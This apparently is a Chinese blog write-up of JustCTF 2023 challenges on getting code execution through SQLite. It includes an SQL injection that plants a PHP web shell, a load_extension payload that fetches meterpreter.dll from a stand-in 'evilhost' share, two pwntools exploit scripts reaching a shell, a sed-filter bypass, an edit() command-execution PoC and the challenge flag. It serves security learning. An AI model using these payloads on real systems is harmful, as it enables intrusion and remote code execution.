@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=EN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta property="og:type" content="article">
+<meta property="og:title" content="从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法">
+<meta property="og:url" content="https://bestwing.me/How-to-hacked-sqlite.html">
+<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-06-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-06-05T06:44:48.089Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="JustCTF">
+<meta property="article:tag" content="sqlite">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search">Search</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/link">Links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/RWCTF-5th-Writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/How-to-hacked-sqlite.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/How-to-hacked-sqlite.html&text=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/How-to-hacked-sqlite.html&is_video=false&description=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法&body=Check out this article: https://bestwing.me/How-to-hacked-sqlite.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/How-to-hacked-sqlite.html&name=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/How-to-hacked-sqlite.html&t=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Known-Attacks-on-SQLite"><span class="toc-number">1.</span> <span class="toc-text">Known Attacks on SQLite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Attach-Database"><span class="toc-number">1.1.</span> <span class="toc-text">Attach Database</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT-load-extension"><span class="toc-number">1.2.</span> <span class="toc-text">SELECT load_extension</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#learned-from-JustCTF"><span class="toc-number">2.</span> <span class="toc-text">learned from JustCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-libc-so"><span class="toc-number">2.1.</span> <span class="toc-text">load libc.so</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-execute-command"><span class="toc-number">2.2.</span> <span class="toc-text">.system execute command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite3-edit-function-execute-command"><span class="toc-number">2.3.</span> <span class="toc-text">sqlite3 edit function execute command</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number"></span> <span class="toc-text">Reference link</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-04T16:00:00.000Z" itemprop="datePublished">2023-06-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/JustCTF/" rel="tag">JustCTF</a>, <a class="tag-link-link" href="/tags/sqlite/" rel="tag">sqlite</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h1><p>周末简单看了下 JustCTF 2023 的题目， 主要是三个题目吸引了我的注意， 分别是 notabug 、notabug2 和Windytooth。 其中前面两个是和 sqlite3 相关的题目。再次和学到一个了一点利用方式。</p>
+<h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>在DEFCON 2017 长亭科技的 slide 中提到两种众所周知的方法： <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">^1</a></p>
+<h4 id="Attach-Database"><a href="#Attach-Database" class="headerlink" title="Attach Database"></a>Attach Database</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;bob&#39;; ATTACH DATABASE &#39;&#x2F;var&#x2F;www&#x2F;lol.php&#39; AS lol; CREATE TABLE lol.pwn </span><br><span class="line">(dataz text); INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;? system($_GET[&#39;cmd&#39;]); </span><br><span class="line">?&gt;&#39;;--</span><br></pre></td></tr></table></figure>
+
+<p>通过写 <code>ATTACH DATABASE</code> 写文件， 然后执行 php 代码</p>
+<h4 id="SELECT-load-extension"><a href="#SELECT-load-extension" class="headerlink" title="SELECT load_extension"></a>SELECT load_extension</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;123 UNION SELECT </span><br><span class="line">1,load_extension(&#39;\\evilhost\evilshare\meterpreter.dll&#39;,&#39;DllMain&#39;);--</span><br></pre></td></tr></table></figure>
+
+<p>在能上传文件的情况在， 且加载扩展的功能必须打开 <a href="https://www.sqlite.org/c3ref/load_extension.html">^2</a> 。在 JustCTF 的 notabug 中也用到这个技巧</p>
+<figure class="highlight python"><figcaption><span>title: "exploit for notabug (JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">13337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;CREATE TABLE images(name TEXT, type TEXT, img BLOB);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;./exp.so&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dt = f.read()</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;INSERT INTO images(name,type,img)&quot;</span>)</span><br><span class="line"></span><br><span class="line">dt = binascii.hexlify(dt)</span><br><span class="line"><span class="comment"># warning(chr(dt[1]))</span></span><br><span class="line"></span><br><span class="line">print(dt.decode())</span><br><span class="line"><span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">f&quot;VALUES(&#x27;icon&#x27;,&#x27;jpeg&#x27;,cast(x&#x27;<span class="subst">&#123;dt.decode()&#125;</span>&#x27; as text));&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;SELECT writefile(&#x27;./exp.so&#x27;,img) FROM images WHERE name=&#x27;icon&#x27;;&quot;</span>)</span><br><span class="line"><span class="comment"># print(hex(int(p.readline())))</span></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;./exp&#x27;,&#x27;exp&#x27;);&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="learned-from-JustCTF"><a href="#learned-from-JustCTF" class="headerlink" title="learned from JustCTF"></a>learned from JustCTF</h3><p>那么如果我们不能上传文件的时候如何利用 <code>load_extension</code> ，方法来做命令执行呢？</p>
+<h4 id="load-libc-so"><a href="#load-libc-so" class="headerlink" title="load libc.so"></a>load libc.so</h4><p>我们可以通过 <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;puts&#39;);</code>  来执行任意的 glibc 方法，例如这里的思路是</p>
+<p>通过 puts 、gets  为预测堆地址，并写入我们的结构，然后爆破堆地址让他在执行 system 的时候,确保是执行我们想要的命令。 exploit 来自 @n132</p>
+<figure class="highlight python"><figcaption><span>title:"exploit for notabug2(JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./sqlite3&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;0.0.0.0&quot;,13339)</span></span><br><span class="line">p = remote(<span class="string">&#x27;notabug2.nc.jctf.pro&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;puts&#x27;);&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">lic = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">warning(hex(lic))</span><br><span class="line">pie_base = lic - <span class="number">0x1589a0</span></span><br><span class="line"></span><br><span class="line">heap = <span class="number">0x00005555556b0000</span><span class="number">-0x0000555555554000</span>+pie_base <span class="comment"># 1/0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_plt = (pie_base+0x2228C)</span></span><br><span class="line">system_plt = pie_base + <span class="number">0x10910</span></span><br><span class="line"><span class="keyword">if</span> pie_base &gt; <span class="number">0x600000000000</span>:</span><br><span class="line">    p.close()</span><br><span class="line">warning(hex(pie_base)) <span class="comment">#lic+0x28b8</span></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;gets&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(p64(heap+<span class="number">0x11eb0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pie_base+<span class="number">0x000000000009e0ad</span>))</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">dt = <span class="string">b&quot;/bin/sh\0&quot;</span>+flat([<span class="number">0</span>]*<span class="number">8</span>)+ flat([<span class="number">0</span>]*<span class="number">8</span>)+ p64(system_plt)</span><br><span class="line">sla(<span class="string">b&quot;lite&gt; &quot;</span>,<span class="string">f&quot;select cast(x&#x27;<span class="subst">&#123;dt.hex()&#125;</span>&#x27; as text), &quot;</span>.encode()+<span class="string">b&quot;Load_extension(&#x27;&quot;</span>+p64(system_plt)[:<span class="number">6</span>]+<span class="string">b&quot;&#x27;,&#x27;/bin/sh&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;echo n132&quot;</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">data = p.read(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;n132&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">    p.sendline(<span class="string">&quot;/jailed/readflag&quot;</span>)</span><br><span class="line">    input()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="system-execute-command"><a href="#system-execute-command" class="headerlink" title=".system execute command"></a>.system execute command</h4><p>在 <code>Command Line Shell For SQLite</code> 界面中， sqlite 是内置了一些方法的 <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">^3</a>  ，其中就包括了 <code>.system</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system CMD ARGS…	Run CMD ARGS… in a system shell</span><br></pre></td></tr></table></figure>
+<p>这是可以直接执行命令的，但是在 JustCTF 中， 程序做了限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ pwnable in /tmp/private [14:10:59]</span></span><br><span class="line">$ cat run-sqlite.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sed -ue <span class="string">&#x27;/^\./ &#123; /^\.open/!d; &#125;&#x27;</span> | /jailed/sqlite3 -interactive<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>这个正则的解释就是:</p>
+<p>这个sed脚本的作用是从输入中筛选出特定的行。它使用正则表达式进行匹配。解释一下脚本的含义：</p>
+<p>/^./：匹配以.开头的行。<br>{ /^.open/!d; }：对于匹配到的以.开头的行，如果行不以.open开头，则删除（d）该行。<br>因此，这个sed命令的作用是删除以.开头但不以.open开头的行。</p>
+<p>因此通常而言我们是不能直接执行 <code>.system</code> 命令的，但是如果和 <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;getchar&#39;);</code> 配合就可以了， 这是 @crazyman 赛后发现的。 大概是正则多行匹配的问题了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31&#39;, &#39;getchar&#39;);</span><br><span class="line"> .system &#x2F;jailed&#x2F;readflag</span><br><span class="line">Runtime error: error during initialization: </span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqlite3-edit-function-execute-command"><a href="#sqlite3-edit-function-execute-command" class="headerlink" title="sqlite3 edit function execute command"></a>sqlite3 edit function execute command</h4><p>在 sqlite 还有一个名叫 <code>Edit()</code> 的函数 <a href="https://www.sqlite.org/cli.html">^4</a>， 该 <code>Edit()</code> 接受一个或两个参数。第一个参数是一个值——通常是一个要编辑的大的多行字符串。第二个参数是对文本编辑器的调用。仔细阅读代码，该方法其实也是可以执行任意命令的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3_create_function(p-&gt;db, <span class="string">&quot;edit&quot;</span>, <span class="number">2</span>, SQLITE_UTF8, <span class="number">0</span>,</span><br><span class="line">                            editFunc, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后调用到 <code>editFunc</code> 中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zCmd = sqlite3_mprintf(<span class="string">&quot;%s \&quot;%s\&quot;&quot;</span>, zEditor, zTempFile);</span><br><span class="line"><span class="keyword">if</span>( zCmd==<span class="number">0</span> )&#123;</span><br><span class="line">  sqlite3_result_error_nomem(context);</span><br><span class="line">  <span class="keyword">goto</span> edit_func_end;</span><br><span class="line">&#125;</span><br><span class="line">rc = system(zCmd);</span><br><span class="line">sqlite3_free(zCmd);</span><br></pre></td></tr></table></figure>
+
+
+<p>这是在 discord 看到另外一个队的PoC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite&gt; .open :memory:</span><br><span class="line">sqlite&gt; CREATE TABLE t(a INT, b VARCHAR(200));</span><br><span class="line">sqlite&gt; insert into t values (0, &#39;&#39;);</span><br><span class="line">sqlite&gt; update t set b&#x3D;edit(&#39;&#39;,&#39;&#x2F;jailed&#x2F;readflag&#39;) where a&#x3D;0;</span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search">Search</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/link">Links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Known-Attacks-on-SQLite"><span class="toc-number">1.</span> <span class="toc-text">Known Attacks on SQLite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Attach-Database"><span class="toc-number">1.1.</span> <span class="toc-text">Attach Database</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT-load-extension"><span class="toc-number">1.2.</span> <span class="toc-text">SELECT load_extension</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#learned-from-JustCTF"><span class="toc-number">2.</span> <span class="toc-text">learned from JustCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-libc-so"><span class="toc-number">2.1.</span> <span class="toc-text">load libc.so</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-execute-command"><span class="toc-number">2.2.</span> <span class="toc-text">.system execute command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite3-edit-function-execute-command"><span class="toc-number">2.3.</span> <span class="toc-text">sqlite3 edit function execute command</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number"></span> <span class="toc-text">Reference link</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/How-to-hacked-sqlite.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/How-to-hacked-sqlite.html&text=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/How-to-hacked-sqlite.html&is_video=false&description=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法&body=Check out this article: https://bestwing.me/How-to-hacked-sqlite.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/How-to-hacked-sqlite.html&title=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/How-to-hacked-sqlite.html&name=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/How-to-hacked-sqlite.html&t=从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
